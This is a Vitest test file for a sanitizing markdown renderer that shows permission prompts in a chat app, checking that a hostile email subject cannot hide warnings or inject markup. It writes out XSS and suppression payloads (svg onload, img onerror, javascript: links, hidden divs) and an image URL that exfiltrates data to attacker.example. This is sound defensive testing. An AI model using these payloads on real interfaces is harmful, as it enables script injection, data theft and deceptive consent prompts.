import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { marked } from 'marked';
import { parseHTML } from 'linkedom';
import {
	renderPromptMarkdown,
	isSafePromptHref,
	PROMPT_EMITTED_TAGS,
	PROMPT_STRIPPED_TAGS,
	PROMPT_ALLOWED_ATTR,
} from './prompt-markdown.js';

/**
 * Two measurements, because the vectors split into two kinds and neither check
 * catches both:
 *
 * - `visibleText` — for suppression that a DOM parser can actually show
 *   (`hidden`, inline `display:none`, comment nodes). It walks the tree because
 *   `html.includes(text)` would call every one of these a pass: the text stays
 *   in the string while rendering as nothing.
 * - `emittedTags` — for vectors whose damage needs a real CSS engine or parser
 *   semantics that linkedom does not implement (`<style>`, `<template>`,
 *   `<script>`, `<svg>`). Their absence from the output IS the property; asking
 *   about visibility here would measure nothing and pass vacuously.
 */

/** Elements whose text content is never shown to the reader. */
const RAW_TEXT_ELEMENTS = new Set(['SCRIPT', 'STYLE', 'TEMPLATE', 'NOSCRIPT', 'TITLE']);

function isHiddenElement(el: Element): boolean {
	const style = el.getAttribute('style') ?? '';
	return (
		el.hasAttribute('hidden') ||
		/display\s*:\s*none/i.test(style) ||
		/visibility\s*:\s*hidden/i.test(style) ||
		/opacity\s*:\s*0(?![.\d])/i.test(style)
	);
}

function visibleText(html: string): string {
	const { document } = parseHTML(`<!doctype html><html><body>${html}</body></html>`);
	const parts: string[] = [];
	const walk = (node: Node): void => {
		for (const child of Array.from(node.childNodes) as Node[]) {
			if (child.nodeType === 8) continue;
			if (child.nodeType === 3) {
				// Adjacent text nodes are one run on screen — an escaped
				// `&lt;div&gt;` arrives split across three of them, so a separator
				// here would fabricate spaces no reader ever sees.
				parts.push((child as Text).data);
				continue;
			}
			if (child.nodeType === 1) {
				const el = child as Element;
				if (RAW_TEXT_ELEMENTS.has(el.tagName) || isHiddenElement(el)) continue;
				walk(child);
				parts.push('\n');
			}
		}
	};
	walk(document.body);
	return parts.join('').replace(/[^\S\n]+/g, ' ').replace(/\n+/g, '\n').trim();
}

function emittedTags(html: string): string[] {
	const tags = new Set<string>();
	for (const match of html.matchAll(/<([a-zA-Z][a-zA-Z0-9]*)[\s/>]/g)) {
		tags.add(match[1]!.toLowerCase());
	}
	return [...tags].sort();
}

/**
 * A live `onclick=`-style handler in the output. The match is anchored inside an
 * opening tag on purpose: a bare `/\son[a-z]+=/` also fires on
 * `&lt;img/src=x onerror=…&gt;`, which is escaped TEXT and completely inert — the
 * same false positive as measuring visibility with `html.includes()`.
 */
function hasEventAttribute(html: string): boolean {
	return /<[a-zA-Z][a-zA-Z0-9]*[^>]*\son[a-z]+\s*=/i.test(html);
}

/**
 * Bare marked — NOT the full pre-fix chain, which also ran
 * `fixMarkdownPreprocessing` and `DOMPurify.sanitize` (MarkdownRenderer.svelte:33).
 * It stands in as the "no overrides" baseline: enough to prove each vector does
 * something harmful without them, which is all it is used for.
 */
function renderBareMarked(text: string): string {
	return marked.parse(text, { async: false }) as string;
}

// A mail_reply confirmation. Everything after "Subject:" comes from an arbitrary
// external sender, so the subject is the attacker's field — not model-mediated.
function replyPrompt(subject: string): string {
	return (
		`**Reply to email?**\n` +
		`**To:** sender@external.example\n` +
		`**Subject:** ${subject}\n\n` +
		`> quoted body text\n\n` +
		`⚠ **Body is 4000 chars — only the first 199 are shown above.**`
	);
}

/**
 * `kind` records what the vector does WITHOUT the overrides, so each case is
 * pinned to the specific harm it demonstrates:
 * - 'suppress' — the warning stops being visible.
 * - 'inject'   — a tag outside PROMPT_EMITTED_TAGS reaches the DOM.
 * The `is sharp` test asserts that harm really occurs on bare marked, so no case
 * can quietly degrade into a tautology that passes for both implementations.
 */
const VECTORS: ReadonlyArray<{ name: string; subject: string; kind: 'suppress' | 'inject' }> = [
	{ name: 'unclosed hidden div', subject: '<div hidden>', kind: 'suppress' },
	{ name: 'display:none div', subject: '<div style="display:none">', kind: 'suppress' },
	{ name: 'block html comment', subject: 'Re: invoice\n\n<!--', kind: 'suppress' },
	{ name: 'style element', subject: '<style>body{display:none}</style>', kind: 'inject' },
	{ name: 'template element', subject: '<template>', kind: 'inject' },
	{ name: 'nested hidden containers', subject: '<div hidden><span hidden>', kind: 'suppress' },
	// The inRawBlock family: a leading <code>/<kbd>/<pre> flips marked's lexer
	// into a raw block, where the DEFAULT text renderer returns tokens verbatim.
	// Without the `text` override these defeat the `html` override entirely.
	{ name: 'code-prefixed hidden div', subject: '<code><div hidden=>', kind: 'inject' },
	{ name: 'code-prefixed comment', subject: '<code><!--', kind: 'suppress' },
	{ name: 'kbd-prefixed hidden div', subject: '<kbd><div hidden=>', kind: 'inject' },
	{ name: 'pre-prefixed hidden div', subject: '<pre><div hidden=>', kind: 'inject' },
	{ name: 'code-prefixed svg onload', subject: '<code><svg/onload=alert(1)>', kind: 'inject' },
	{ name: 'code-prefixed img onerror', subject: '<code><img/src=x onerror=alert(1)>', kind: 'inject' },
];

describe('renderPromptMarkdown — the prompt cannot be suppressed', () => {
	for (const { name, subject } of VECTORS) {
		it(`keeps body and warning visible against ${name}`, () => {
			const visible = visibleText(renderPromptMarkdown(replyPrompt(subject)));
			expect(visible).toContain('Body is 4000 chars');
			expect(visible).toContain('quoted body text');
		});
	}

	// Guards the assertions above against measuring nothing: every vector must
	// demonstrably do harm without the overrides, or it is not a test case.
	it('every vector is sharp — bare marked really suppresses or injects', () => {
		const inert = VECTORS.filter(({ subject, kind }) => {
			const bare = renderBareMarked(replyPrompt(subject));
			return kind === 'suppress'
				? visibleText(bare).includes('Body is 4000 chars')
				: emittedTags(bare).every((tag) => PROMPT_EMITTED_TAGS.includes(tag));
		});
		expect(inert.map((v) => v.name)).toStrictEqual([]);
	});
});

describe('renderPromptMarkdown — nothing outside the expected tag set is emitted', () => {
	for (const { name, subject } of VECTORS) {
		it(`emits only expected tags against ${name}`, () => {
			const out = renderPromptMarkdown(replyPrompt(subject));
			const unexpected = emittedTags(out).filter((tag) => !PROMPT_EMITTED_TAGS.includes(tag));
			expect(unexpected).toStrictEqual([]);
			expect(hasEventAttribute(out)).toBe(false);
		});
	}

	it('renders raw html as visible text instead of structure', () => {
		const out = renderPromptMarkdown(replyPrompt('<div hidden>'));
		expect(out).not.toMatch(/<div/i);
		expect(visibleText(out)).toContain('<div hidden>');
	});

	// Pins the tag set to reality in BOTH directions. Anything marked emits is
	// either permitted or knowingly stripped — a third case would be deleted in
	// the browser and invisible to CI, which is content loss. Task lists are in
	// here specifically because `input` slipped past an earlier version of this
	// test that only checked the permitted list.
	const RICH_PROMPT = [
		'# Heading', '## Sub', '**bold** _em_ ~~del~~ `code`',
		'> quote', '- a\n- b', '1. one\n2. two', '3. third\n4. fourth', '---',
		'| a | b |\n| :-- | --: |\n| 1 | 2 |',
		'```json\n{"a":1}\n```', '[link](https://example.com)',
		'- [ ] todo\n- [x] done',
		'text with\nsingle newline',
	].join('\n\n');

	it('a full-featured prompt emits only permitted or knowingly-stripped tags', () => {
		const unaccounted = emittedTags(renderPromptMarkdown(RICH_PROMPT)).filter(
			(tag) => !PROMPT_EMITTED_TAGS.includes(tag) && !PROMPT_STRIPPED_TAGS.includes(tag),
		);
		expect(unaccounted).toStrictEqual([]);
	});

	it('really does emit every knowingly-stripped tag', () => {
		// Otherwise the list is a place to park guesses: a name nothing produces
		// looks like a considered decision while documenting nothing.
		const emitted = emittedTags(renderPromptMarkdown(RICH_PROMPT));
		expect(PROMPT_STRIPPED_TAGS.filter((tag) => !emitted.includes(tag))).toStrictEqual([]);
	});

	it('carries task-list text outside the checkbox element', () => {
		// `input` is void, so its removal by layer 2 can only cost the box. This
		// asserts the precondition — the text lives in the <li>, not the input —
		// which is what makes stripping `input` safe.
		const visible = visibleText(renderPromptMarkdown('> - [ ] todo item\n> - [x] done item'));
		expect(visible).toContain('todo item');
		expect(visible).toContain('done item');
	});

	// These two assert the CONFIGURATION, not its effect, and the distinction is
	// the honest part: layer 2 does not run in the test environment, so no test
	// here can observe an attribute being kept or dropped. They exist so that
	// removing an entry fails deliberately rather than silently — an earlier
	// version asserted `start="3"` in the output and passed with `start` absent
	// from the list, which measured nothing at all.
	it('keeps `start` permitted, so an ordered list is not renumbered', () => {
		// marked emits <ol start="3"> for `3. third`; dropping the attribute would
		// renumber it to 1, 2 and the prompt would show values its text does not.
		expect(renderPromptMarkdown('3. third\n4. fourth')).toContain('start="3"');
		expect(PROMPT_ALLOWED_ATTR).toContain('start');
	});

	it('keeps the attribute list free of anything that can carry script', () => {
		const dangerous = PROMPT_ALLOWED_ATTR.filter(
			(attr) => attr.startsWith('on') || attr === 'style' || attr === 'srcdoc',
		);
		expect(dangerous).toStrictEqual([]);
	});
});

describe('renderPromptMarkdown — content is never dropped', () => {
	// A link-reference definition renders nothing at all, so a multi-line one
	// swallows every line caught inside its title — suppression without any HTML.
	it('does not let a multi-line link-reference definition swallow lines', () => {
		const prompt = '**Allow?**\n\n[a]: https://e.example "\n\n> quoted body text\n\n⚠ **Body is 4000 chars**\n"';
		const visible = visibleText(renderPromptMarkdown(prompt));
		expect(visible).toContain('Body is 4000 chars');
		expect(visible).toContain('quoted body text');
		// Sharpness: bare marked really does swallow it.
		expect(visibleText(renderBareMarked(prompt))).not.toContain('Body is 4000 chars');
	});

	it('never emits an img, so displaying a prompt fires no outbound request', () => {
		// marked's default renderer emits <img src="…">, which loads on render —
		// an exfil channel that needs no click.
		const out = renderPromptMarkdown(replyPrompt('![t](https://attacker.example/?d=secret)'));
		expect(out).not.toMatch(/<img/i);
		expect(out).not.toContain('attacker.example');
		expect(visibleText(out)).toContain('[image: t]');
	});

	it('strips unsafe link schemes but keeps their text', () => {
		for (const href of [
			'javascript:alert(1)',
			'JaVaScRiPt:alert(1)',
			'data:text/html,<script>alert(1)</script>',
			'vbscript:msgbox',
		]) {
			const out = renderPromptMarkdown(`Click [here](${href}) now`);
			expect(out).not.toMatch(/href=/i);
			expect(visibleText(out)).toContain('here');
		}
	});

	it('keeps safe links clickable', () => {
		const out = renderPromptMarkdown('See [docs](https://example.com/a?b=1)');
		expect(out).toContain('href="https://example.com/a?b=1"');
		expect(out).toContain('rel="noreferrer noopener"');
	});

	it('isSafePromptHref refuses relative and scheme-less targets', () => {
		expect(isSafePromptHref('https://example.com')).toBe(true);
		expect(isSafePromptHref('mailto:a@b.example')).toBe(true);
		expect(isSafePromptHref('/settings')).toBe(false);
		expect(isSafePromptHref('example.com')).toBe(false);
		expect(isSafePromptHref('javascript:alert(1)')).toBe(false);
	});

	// The question is the dialog's ONLY text, so absent text must not render as
	// nothing: bare Yes/No buttons are the blank prompt this module prevents,
	// reached through a broken payload rather than an attack. A throw inside
	// {@html} has the same effect. The engine types this as a string, so this
	// covers the runtime gap.
	it('says the text is missing rather than rendering an empty prompt', () => {
		for (const bad of [undefined, null, '', 42]) {
			expect(() => renderPromptMarkdown(bad as unknown as string)).not.toThrow();
			const visible = visibleText(renderPromptMarkdown(bad as unknown as string));
			expect(visible).toContain('Prompt text unavailable');
			expect(visible).toContain('Deny unless');
		}
	});
});

describe('renderPromptMarkdown — escaping stays invisible to the reader', () => {
	// The `text` override escapes tokens marked would emit verbatim. Doing that
	// naively double-escapes anything already an entity, and the damage is
	// user-visible in ordinary prompts — a company name with an ampersand.
	it.each([
		['plain ampersand', 'Tom & Jerry GmbH', 'Tom & Jerry GmbH'],
		['pre-escaped ampersand', 'Tom &amp; Jerry', 'Tom & Jerry'],
		['url with query', 'api.example/v1?a=1&b=2', 'api.example/v1?a=1&b=2'],
		['numeric entity', 'a&#38;b', 'a&b'],
	])('renders %s as the reader expects', (_name, subject, expected) => {
		// visibleText resolves entities, so it sees what a reader sees.
		expect(visibleText(renderPromptMarkdown(`**Subject:** ${subject}`))).toContain(expected);
	});

	it('leaves a non-breaking space intact rather than showing &nbsp;', () => {
		const out = renderPromptMarkdown('**Subject:** a&nbsp;b');
		expect(out).not.toContain('&amp;nbsp;');
		expect(out).toContain('&nbsp;');
	});

	it('still escapes a bare angle bracket', () => {
		// The entity carve-out must not extend to the characters that build tags.
		expect(renderPromptMarkdown('**Subject:** 5 < 6 > 4')).not.toMatch(/<(?!\/?(p|strong|br)\b)/);
	});
});

describe('renderPromptMarkdown — the prompt still reads as intended', () => {
	it('preserves the emphasis and blockquote the previews rely on', () => {
		const out = renderPromptMarkdown(replyPrompt('Quarterly report'));
		expect(out).toContain('<strong>');
		expect(out).toContain('<blockquote>');
		expect(visibleText(out)).toContain('Quarterly report');
	});

	it('gives every field its own line', () => {
		// Single newlines separate the fields; collapsing them into one run-on
		// paragraph is what makes the fields unreadable as distinct values.
		expect(renderPromptMarkdown(replyPrompt('Quarterly report'))).toMatch(/<br\s*\/?>/);
		expect(renderBareMarked(replyPrompt('x'))).not.toMatch(/<br\s*\/?>/);
	});

	it('renders code fences without executing anything', () => {
		const out = renderPromptMarkdown('Payload:\n\n```json\n{"a":"<script>alert(1)</script>"}\n```');
		expect(out).toContain('<code');
		expect(out).not.toMatch(/<script/i);
		expect(visibleText(out)).toContain('alert(1)');
	});
});

/**
 * The wiring guard. There is no DOM environment or svelte plugin in the vitest
 * config, so a component test cannot exist here — which means without this,
 * reverting the call site to MarkdownRenderer would leave the whole suite green
 * and every test above would still pass while prompts rendered unsafely again.
 * Same approach as app.css.test.ts: assert against the source text.
 */
describe('ChatView wiring', () => {
	const source = readFileSync(
		new URL('../components/ChatView.svelte', import.meta.url),
		'utf-8',
	);

	it('renders the prompt through renderPromptMarkdown', () => {
		// Whitespace-tolerant: a formatter run must not silently disarm the guard.
		expect(source).toMatch(/\{@html\s+renderPromptMarkdown\(\s*pendingPermission\.question\s*\)\s*\}/);
		expect(source).toMatch(/import\s*\{\s*renderPromptMarkdown\s*\}\s*from\s*'\.\.\/utils\/prompt-markdown\.js'/);
	});

	// An allowlist of every MarkdownRenderer call, not a search for one bad
	// pattern. Matching on `content={pendingPermission.question}` was evadable by
	// a line break or a local alias (`content={q}`) — this notices any new call
	// site at all, which is the property actually wanted.
	it('routes only chat message text through the chat markdown renderer', () => {
		// All three are assistant/chat message text inside the messages loop.
		// A fourth entry appearing here is the signal to check whether it carries
		// prompt text — this list existing is what makes that visible.
		const contents = [...source.matchAll(/<MarkdownRenderer[^>]*?content=\{([^}]*)\}/gs)]
			.map((m) => m[1]!.replace(/\s+/g, ' ').trim())
			.sort();
		expect(contents).toStrictEqual(['gBlock.text', 'lg.text', 'msg.content']);
	});

	it('keeps the Allow/Deny branch on plain pre', () => {
		// That branch is immune because it never parses markdown at all; losing
		// the <pre> would quietly opt the guard prompts into rendering.
		expect(source).toMatch(/<pre[^>]*>\{pendingPermission\.question\}<\/pre>/);
	});
});
